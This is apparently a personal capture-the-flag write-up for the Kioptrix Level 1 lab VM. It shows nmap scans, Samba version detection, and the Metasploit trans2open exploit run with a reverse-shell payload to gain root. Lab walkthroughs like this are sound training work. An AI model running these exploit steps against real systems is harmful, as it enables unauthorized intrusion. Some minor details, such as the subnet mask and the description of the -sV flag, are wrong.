# Kioptrix: Level 1
### Solved using Metasploit

Let Host discovery from Attack machine , run `ifconifg` and note our machine ip `192.168.69.5` , so network IP range will be `192.168.69.0` - `192.168.69.255` with subnet of `255:225:225:0`

`-sn` Ping Scan Disable port

```
nmap -sn 192.168.69.0/24
```

output

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 23:24 CDT
Nmap scan report for 192.168.69.1
Host is up (0.00022s latency).
Nmap scan report for 192.168.69.5
Host is up (0.00013s latency).
Nmap scan report for 192.168.69.6                <<<<<< vuln machine
Host is up (0.00046s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.91 seconds
```

we got machine running on 192.168.69.6

<img src="../img/Pasted image 20240529095558.png" alt="Example Image" width="1080"/>

Version Scan

```
nmap -sV 192.168.69.6
```

```
-sV: Probe open ports to determine service/version info
             --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
             --version-light: Limit to most likely probes (intensity 2)
             --version-all: Try every single probe (intensity 9)
             --version-trace: Show detailed version scan activity (for debugging)
```

output

```
└─$ nmap -sV 192.168.69.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 23:27 CDT
Nmap scan report for 192.168.69.6
Host is up (0.00042s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```

`-sV` enable OS detection and version detection , script scanning , traceroute

we know it running , Samba and its Server Message Block server ,then find version of that service , using Metasploit , search `smb_version` exploit in Metasploit , and got `auxiliary/scanner/smb/smb_version`

```
msfconsole
use auxiliary/scanner/smb/smb_version
show options
```

```
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s)
```

set target machine ip for `rhosts`

```
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.69.6
rhosts => 192.168.69.6
exploit
```

```
[*] 192.168.69.6:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.69.6:139      -   Host could not be identified: Unix (Samba 2.2.1a) <<<<<,
[*] 192.168.69.6:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/

it looks like version Samba 2.2.1a is vulnerable to `exploit/linux/samba/trans2open`

Description of trans2open

```
This exploits the buffer overflow found in Samba versions
  2.2.0 to 2.2.8. This particular module is capable of
  exploiting the flaw on x86 Linux systems that do not
  have the noexec stack option set.
```

```
use  exploit/linux/samba/trans2open
set payload generic/shell_reverse_tcp    # Becuase no payload has been configed
set rhosts 192.168.69.6
run
```

Boom !!! we got root flag

<img src="../img/Pasted image 20240529101919.png" alt="Example Image" width="1080"/>

I Escalated Root Access !!
